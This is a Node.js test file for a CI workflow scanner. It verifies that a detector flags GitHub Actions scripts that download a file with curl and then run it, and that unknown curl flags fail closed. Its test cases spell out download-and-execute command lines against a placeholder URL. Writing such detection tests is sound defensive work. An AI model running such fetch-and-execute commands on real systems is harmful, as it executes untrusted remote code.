'use strict';
const test=require('node:test'),assert=require('node:assert/strict');
const {findingsForScript}=require('./ultra_sentinel_advanced_execution.cjs');
const {inspectWorkflow}=require('./ultra_sentinel_yaml_ast.cjs');
const U='https://example.invalid/x',HIGH='REMOTE_DOWNLOADED_FILE_EXECUTION',INC='REMOTE_EXECUTION_ANALYSIS_INCOMPLETE';
const audit=s=>{const y=['on: push','permissions: read-all','jobs:','  a:','    runs-on: ubuntu-latest','    steps:','      - run: |',...s.split('\n').map(x=>'          '+x)].join('\n')+'\n';return inspectWorkflow(y,{path:'.github/workflows/sentinel-round19.yml'});};
for(const [name,script] of [
 ['trace file literal','curl --trace -- -o bin/payload '+U+'; chmod +x bin/payload; bin/payload'],
 ['trace ascii literal','curl --trace-ascii -- -o bin/payload '+U+'; bin/payload'],
 ['dump header long','curl --dump-header -- -o bin/payload '+U+'; bin/payload'],
 ['dump header short','curl -D -- -o bin/payload '+U+'; bin/payload'],
 ['trace quoted',"curl '--trace' -- -o bin/payload "+U+'; bin/payload'],
 ['trace nested directory','curl --trace -- -o bin/sub/payload '+U+'; bin/sub/payload']
])test('round19 detect '+name,()=>{
 const found=findingsForScript(script);
 assert.ok(found.includes(HIGH),name+JSON.stringify(found));
 assert.ok(audit(script).findings.some(f=>f.rule===HIGH),name);
});
for(const [name,script] of [
 ['unknown flag relative executable','curl --future-option -- -o bin/payload '+U+'; bin/payload'],
 ['unknown quoted relative executable',"curl '--future-option' -- -o dir/sub/payload "+U+'; dir/sub/payload'],
 ['unknown short relative executable','curl -Z -- -o bin/payload '+U+'; chmod +x bin/payload; bin/payload']
])test('round19 fail closed '+name,()=>{
 const actual=findingsForScript(script);
 assert.ok(actual.includes(INC)||actual.includes(HIGH),name+JSON.stringify(actual));
 assert.notEqual(audit(script).status,'NO_RISK_PATTERN',name);
});
for(const [name,script] of [
 ['trace download only','curl --trace -- -o bin/payload '+U],
 ['trace diagnostic only','curl --trace -- '+U],
 ['trace with real delimiter','curl --trace -- -- -o payload '+U+'; bash payload'],
 ['unknown downloader no execution','curl --future-option -- -o bin/payload '+U+'; echo payload'],
 ['trace unrelated target','curl --trace -- -o safe '+U+'; bin/payload']
])test('round19 benign '+name,()=>{
 assert.ok(!findingsForScript(script).includes(HIGH),name);
});
